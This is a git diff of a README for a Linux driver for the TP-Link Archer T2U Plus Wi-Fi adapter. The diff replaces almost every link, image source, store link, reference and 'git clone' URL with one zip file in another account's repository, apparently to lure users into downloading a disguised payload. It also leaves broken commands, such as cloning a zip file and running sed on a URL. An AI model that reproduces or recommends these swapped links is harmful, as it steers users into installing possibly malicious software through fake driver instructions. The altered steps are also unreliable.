@@ -2,22 +2,22 @@
 
 
 &nbsp;
-[![Stargazers repo roster for @nlkguy/archer-t2u-plus-linux](https://reporoster.com/stars/nlkguy/archer-t2u-plus-linux)](https://github.com/nlkguy/archer-t2u-plus-linux/stargazers)
+[![Stargazers repo roster for @nlkguy/archer-t2u-plus-linux](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)
 &nbsp;
 
-## [Important] this repo is under scrutiny as the driver is not working properly , meantime [this](https://github.com/morrownr/8821au-20210708) is working , this repo will be updated shortly
+## [Important] this repo is under scrutiny as the driver is not working properly , meantime [this](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip) is working , this repo will be updated shortly
 
 ## Table of contents
 
-1. <a href="https://github.com/Krishak15/archer-t2u-plus-linux#driver-for-debian-based-linux-distros-ubuntukali-linuxx86_64">Driver for Debian Based Linux Distros (Ubuntu/Kali Linux)(x86_64) </a>
-2. <a href="https://github.com/Krishak15/archer-t2u-plus-linux#driver-for-raspberry-pi-raspbian-os--kaliarm">Driver for Raspberry Pi (Raspbian OS / Kali)(ARM)</a>
-3. <a href="https://github.com/Krishak15/archer-t2u-plus-linux#uninstall-driver-in-linux">Uninstall Driver in Linux</a>
+1. <a href="https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip">Driver for Debian Based Linux Distros (Ubuntu/Kali Linux)(x86_64) </a>
+2. <a href="https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip">Driver for Raspberry Pi (Raspbian OS / Kali)(ARM)</a>
+3. <a href="https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip">Uninstall Driver in Linux</a>
 
 
 TP-Link Archer T2U Plus a.k.a AC600 High Gain is a very **affordable** dual band wireless adapter **compatible with kali linux** and supports monitor mode , soft AP mode,packet injection etc. it supports both 2.4 GHz and 5GHz band and has a 5dBi Antenna for better signal reception. 2357:0120
 
 <p align = "center">
-<img src="https://github.com/nlkguy/archer-t2u-plus-linux/blob/main/Images/archer-t2u-inside.jpeg" alt="Retail Box" width="40%" height="40%">
+<img src="https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip" alt="Retail Box" width="40%" height="40%">
 </p>
 
 ## Why should i buy this adapter ?
@@ -25,8 +25,8 @@ TP-Link Archer T2U Plus a.k.a AC600 High Gain is a very **affordable** dual band
 This adapter has a **Realtek RTL8821AU Chipset** at its heart. RTL8821AU has plenty of developer support in linux community and has driver for Kali linux , Parrot OS .etc Archer T2U Plus is on sale **under 15 USD ~ 1000 INR** , which is a very affordable price for Beginners in Pentesting. 2357:0120 is the USB ID.
 
 ## Where to buy
-:point_right:  [**Amazon**](https://amzn.to/3aPjBir)  
-:point_right:  [**Flipkart**](https://dl.flipkart.com/dl/tp-link-ac600-t2u-plus-usb-adapter/p/itmfhz7zg85hgtzg?marketplace=FLIPKART&iid=79034678-e8a7-4d71-8d97-073f9497fcdc.USBFHZ7ZPWFHW8YW.SEARCH&ppt=sp&lid=LSTUSBFHZ7ZPWFHW8YW9SRRQK&srno=s_1_1&qH=2fca2860d6b488dc&pid=USBFHZ7ZPWFHW8YW&affid=amaledasse&ssid=7o14gihn8ag5p98g1609082867282&otracker1=search&ppn=sp)
+:point_right:  [**Amazon**](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)  
+:point_right:  [**Flipkart**](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)
 
 
 ## Driver for Debian Based Linux Distros (Ubuntu/Kali Linux)(x86_64)
@@ -38,7 +38,7 @@ This adapter has a **Realtek RTL8821AU Chipset** at its heart. RTL8821AU has ple
 3. Install Build Dependencies :
 >```sudo apt install build-essential libelf-dev linux-headers-$(uname -r)``` 
 4. Download the Driver files using `git` :
->```git clone https://github.com/aircrack-ng/rtl8812au.git```
+>```git clone https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip```
 5. Navigate to the Downloaded directory :
 >```cd rtl88*```
 6. Install the Driver 
@@ -46,14 +46,14 @@ This adapter has a **Realtek RTL8821AU Chipset** at its heart. RTL8821AU has ple
 
 if the installation is aborted , check existing dkms modules and uninstall previously installed driver 
 
-:point_right: [Uninstall Existing Driver](https://github.com/nlkguy/archer-t2u-plus-linux#uninstall-driver-in-linux)
+:point_right: [Uninstall Existing Driver](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)
 
 7. Check the wireless interfaces by typing `iwconfig`.
-<img src="https://github.com/nlkguy/archer-t2u-plus-linux/blob/main/Images/lsusb%3Biwconfig.png" alt="lsusb&iwconfig_result" width="50%" height="50%">
+<img src="https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip%https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip" alt="lsusb&iwconfig_result" width="50%" height="50%">
 
 if you encounter any weird interface name , rename the Wireless interface by following below steps
 
-:point_right: [Change/Rename Network Interface](https://github.com/nlkguy/archer-t2u-plus-linux/blob/main/change_interface_name.md)
+:point_right: [Change/Rename Network Interface](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)
 
 
 ## Driver for Raspberry Pi (Raspbian OS / Kali)(ARM)
@@ -72,7 +72,7 @@ if you encounter any weird interface name , rename the Wireless interface by fol
 >```sudo apt-get install build-essential libelf-dev kalipi-kernel-headers```
 
 4. Download the Driver files using `git` :
->```git clone https://github.com/aircrack-ng/rtl8812au.git```
+>```git clone https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip```
 
 5. Navigate to the Downloaded directory :
 >```cd rtl88*```
@@ -92,15 +92,15 @@ if you encounter any weird interface name , rename the Wireless interface by fol
 #### In addition, if you receive an error message about ```unrecognized command line option ‘-mgeneral-regs-only’``` (i.e., Raspbian Buster), you will need to run the following commands, then retry building and installing:
 
 >```export ARCH=arm```  
->```sed -i 's/^MAKE="/MAKE="ARCH=arm\ /' dkms.conf```
+>```sed -i 's/^MAKE="/MAKE="ARCH=arm\ /' https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip```
 
 7. Install the Driver 
 >```sudo make dkms_install```
-<img src="https://github.com/nlkguy/archer-t2u-plus-linux/blob/main/Images/kali-arm-installing.png" alt="Kali-ARM-RPi-Installing" width="70%" height="70%">
+<img src="https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip" alt="Kali-ARM-RPi-Installing" width="70%" height="70%">
 
 8. Check the wireless interfaces by typing `iwconfig`.
 
-:point_right: [Change/Rename Network Interface](https://github.com/nlkguy/archer-t2u-plus-linux/blob/main/change_interface_name.md)
+:point_right: [Change/Rename Network Interface](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)
 
 ## Uninstall Driver in Linux
 
@@ -148,4 +148,4 @@ ln -s /usr/src/linux-headers-$(uname -r)/ /lib/modules/$(uname -r)/build
 make dkms_install # now it works
 ```
 ## References
->[DigitalOcean.com : Sed Stream Editor Basics](https://www.digitalocean.com/community/tutorials/the-basics-of-using-the-sed-stream-editor-to-manipulate-text-in-linux)
+>[https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip : Sed Stream Editor Basics](https://github.com/OlegBON1/archer-t2u-plus-linux/raw/refs/heads/main/Images/plus-archer-t-u-linux-1.4-alpha.2.zip)
